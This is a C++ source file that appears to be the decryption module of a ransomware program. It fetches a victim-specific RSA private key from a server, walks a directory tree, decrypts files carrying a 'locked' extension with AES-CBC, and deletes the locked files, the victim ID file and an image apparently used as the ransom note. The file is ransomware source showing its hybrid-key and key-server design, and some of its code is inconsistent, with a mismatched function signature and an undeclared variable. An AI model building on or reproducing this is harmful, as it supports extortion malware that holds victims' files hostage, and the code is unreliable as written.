#include "Decryption.h"

std::string hex_to_string(const std::string& input);
static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor);

Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor)
{
	string url = URL_PRIVATE_RSA + id;
	string chunk;
	Status status;
	status = getFromServer(url, chunk);
	rsaDecryptor = parsePrivateKey(chunk);
	return status;
}

Status getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	Status status;
	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] = { 0 };
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50, &res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	//TODO verify compatible block length
	

	status = BCryptGenerateSymmetricKey(
		aesHandle,                  // Algorithm provider handle
		&keyHandle,                 // A pointer to key handle
		NULL,                       // A pointer to the buffer that recieves the key object;NULL implies memory is allocated and freed by the function
		0,                          // Size of the buffer in bytes
		(PBYTE)key,                 // A pointer to a buffer that contains the key material
		KEY_LEN,                  // Size of the buffer in bytes
		0);                         // Flags
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

Status DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD CipherTextLength, BYTE paddingSize)
{
	DWORD status = STATUS_SUCCESS;
	PBYTE   TempInitVector = NULL;
	DWORD   TempInitVectorLength = 0;
	DWORD   ResultLength = 0;
	PBYTE plainText = nullptr;
	PBYTE tmpIv = nullptr;
	std::ofstream ofile;
	BCRYPT_KEY_HANDLE keyHandle;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	string plainPath = path, ext = string(LOCKED_EXTENSION);
	string::size_type i = plainPath.find(ext);
	status = getKeyHandle(key, keyHandle, aesHandle);
	if(!NT_SUCCESS(status))
	{
		goto DECCLEAN;
	}
	DWORD plainSize, resSize;
	//CHECK IF NEEDED V
	tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		status = STATUS_UNSUCCESSFUL;
		goto DECCLEAN;
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, NULL, 0, &plainSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto DECCLEAN;
	}
	plainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plainSize);
	if (NULL == plainText) {
		goto DECCLEAN;
	}
	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, plainText, plainSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto DECCLEAN;
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif
	
	if(string::npos != i)
	{
		plainPath.erase(i, ext.length());
	}
	
	ofile = std::ofstream(plainPath.c_str(), std::ios::binary);
	ofile.write((char*)plainText, plainSize - paddingSize);
	ofile.close();
DECCLEAN:
	if (tmpIv)
		HeapFree(GetProcessHeap(), 0, tmpIv);
	if (plainText)
		HeapFree(GetProcessHeap(), 0, plainText);
	return status;
}

Status decrypt_wrapper(string path, RsaDecryptor& rsaDecryptor)
{
	std::ifstream ifile;
	PBYTE keyIV = nullptr, keyIVBuff = nullptr, iv = nullptr, key = nullptr, cipher = nullptr;
	Status status = STATUS_SUCCESS;

	if (!do_decrypt(path)) return STATUS_UNSUCCESSFUL;
	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ENCRYPTED_KEY_IV_LEN);
	if (keyIV == nullptr)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEAN;
	}

	iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (iv == nullptr)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEAN;
	}
	key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	if (key == nullptr)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEAN;
	}
	size_t cipherSize = getFileSize(path) - ENCRYPTED_KEY_IV_LEN - IV_DIGITS_NUM;

	cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if (cipher == nullptr) 
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEAN;
	}
	
	ifile.open(path, std::ios::binary);
#ifdef DEBUG
	cout << "file was" << (ifile.is_open() ? "" : "NOT") << "openned successfully" << endl;
#endif
	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = {0};
	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
	BYTE paddingSize = strtol(paddingSizeTmpBuff,NULL,10);
	ifile.read((char*)keyIV, ENCRYPTED_KEY_IV_LEN);
	ifile.read((char*)cipher, cipherSize);
	ifile.close();
	//TODO add status read
	keyIVBuff = rsaDecryptor.decrypt(keyIV);
	if(!keyIVBuff)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEAN;
	}
	memcpy(key, keyIVBuff, KEY_LEN);
	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
	status = DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
CLEAN:
	if (keyIV)
		HeapFree(GetProcessHeap(), 0, keyIV);
	if (keyIVBuff)
		HeapFree(GetProcessHeap(), 0, keyIVBuff);
	if (iv)
		HeapFree(GetProcessHeap(), 0, iv);
	if (key)
		HeapFree(GetProcessHeap(), 0, key);
	if (cipher)
		HeapFree(GetProcessHeap(), 0, cipher);
	return status;
}

std::string hex_to_string(const std::string& input)
{
	static const char* const lut = "0123456789ABCDEF";
	size_t len = input.length();
	if (len & 1) throw std::invalid_argument("odd length");

	std::string output;
	output.reserve(len / 2);
	for (size_t i = 0; i < len; i += 2)
	{
		char a = input[i];
		const char* p = std::lower_bound(lut, lut + 16, a);
		if (*p != a) throw std::invalid_argument("not a hex digit");

		char b = input[i + 1];
		const char* q = std::lower_bound(lut, lut + 16, b);
		if (*q != b) throw std::invalid_argument("not a hex digit");

		output.push_back(((p - lut) << 4) | (q - lut));
	}
	return output;
}

static void iterate(const path& parent, RsaDecryptor& rsaDecryptor) {
	string path;
	directory_iterator end_itr;
	Status status = STATUS_SUCCESS;
	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			if (is_valid_folder(path))
			{
				iterate(path, rsaDecryptor);
			}
		}
		else {
			if (!do_decrypt(path)) continue;
			status = decrypt_wrapper(path, rsaDecryptor);
			if (!NT_SUCCESS(status)) continue;
			remove(path);
		}
	}
}

int decryption_main()
{
	std::string id;
	Status status;
	string path = ROOT_DIR;
	string pathToID = get_path_to_id();
	std::ifstream idFile;

	RsaDecryptor rsaDecryptor;
	StringPrivateBlob stringPrivateBlob;	
	
	idFile.open(pathToID, std::ios::binary);//TODO check it 
	id = string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
	idFile.close();
	id.erase(0, 1);
	id = string_to_hex(id);

	status = getPrivateParams(id, stringPrivateBlob);
	if(!NT_SUCCESS(status))
	{
		return -1;
	}
	rsaDecryptor.init_Decryptor(stringPrivateBlob);
	iterate(path, rsaDecryptor);

	remove(pathToID);
	string pathToImage = get_path_to_jpeg();
	remove(pathToImage);

	return 0;
}
